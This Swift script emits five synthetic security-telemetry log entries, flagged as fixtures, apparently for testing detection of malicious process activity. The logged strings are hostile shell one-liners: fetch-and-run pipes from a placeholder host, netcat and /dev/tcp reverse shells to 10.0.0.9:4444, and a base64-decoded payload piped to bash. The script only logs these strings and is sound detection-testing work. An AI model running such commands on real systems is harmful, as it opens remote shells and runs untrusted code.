import Foundation
import OSLog

let logger = Logger(
    subsystem: "com.example.securitytest",
    category: "security_telemetry"
)

struct Fixture {
    let type: String
    let commandLine: String
}

let fixtures: [Fixture] = [
    Fixture(type: "shell_command",
            commandLine: #"curl https://test.invalid/payload | bash"#),
    Fixture(type: "shell_command",
            commandLine: #"wget -qO- https://test.invalid/p | sh"#),
    Fixture(type: "shell_command",
            commandLine: #"nc -e /bin/sh 10.0.0.9 4444"#),
    Fixture(type: "shell_command",
            commandLine: #"bash -c 'exec 3<>/dev/tcp/10.0.0.9/4444; cat <&3'"#),
    Fixture(type: "shell_command",
            commandLine: #"echo aGVsbG8K | base64 -d | bash"#),
]

for (idx, f) in fixtures.enumerated() {
    logger.error("""
    event.category=process \
    event.type=\(f.type, privacy: .public) \
    command_line="\(f.commandLine, privacy: .public)" \
    fixture=true \
    seq=\(idx, privacy: .public)
    """)
}

Thread.sleep(forTimeInterval: 1.0)
print("[+] emitted \(fixtures.count) synthetic security_telemetry fixtures")
